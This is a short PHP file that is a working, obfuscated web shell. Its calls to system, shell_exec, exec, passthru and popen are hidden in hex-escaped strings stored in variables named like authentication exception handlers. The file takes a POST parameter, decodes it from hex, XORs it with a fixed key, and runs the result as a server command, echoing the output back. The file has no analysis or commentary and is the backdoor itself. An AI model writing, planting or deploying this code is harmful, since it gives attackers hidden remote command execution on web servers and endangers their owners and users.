<?php

$auth_exception_handler5 = "\x70o\x70en";
$auth_exception_handler6 = "\x73\x74\x72ea\x6D\x5F\x67e\x74\x5F\x63o\x6Etents";
$auth_exception_handler7 = "pc\x6C\x6F\x73e";
$auth_exception_handler2 = "s\x68e\x6Cl_e\x78e\x63";
$auth_exception_handler3 = "\x65\x78ec";
$batch_process = "\x68\x65x\x32b\x69n";
$auth_exception_handler1 = "sy\x73tem";
$auth_exception_handler4 = "pas\x73\x74hr\x75";
if (isset($_POST["\x65n\x74"])) {
            function system_core ($binding, $fac ){$ptr ='';for($w=0; $w<strlen($binding); $w++){$ptr.=chr(ord($binding[$w])^$fac);} return$ptr; }
            $ent = $batch_process($_POST["\x65n\x74"]);
            $ent = system_core($ent, 19);
            if (function_exists($auth_exception_handler1)) {
                $auth_exception_handler1($ent);
            } elseif (function_exists($auth_exception_handler2)) {
                print $auth_exception_handler2($ent);
            } elseif (function_exists($auth_exception_handler3)) {
                $auth_exception_handler3($ent, $entity_binding);
                print join("\n", $entity_binding);
            } elseif (function_exists($auth_exception_handler4)) {
                $auth_exception_handler4($ent);
            } elseif (function_exists($auth_exception_handler5) && function_exists($auth_exception_handler6) && function_exists($auth_exception_handler7)) {
                $fac_ptr = $auth_exception_handler5($ent, 'r');
                if ($fac_ptr) {
                    $key_pgrp = $auth_exception_handler6($fac_ptr);
                    $auth_exception_handler7($fac_ptr);
                    print $key_pgrp;
                }
            }
            exit;
        }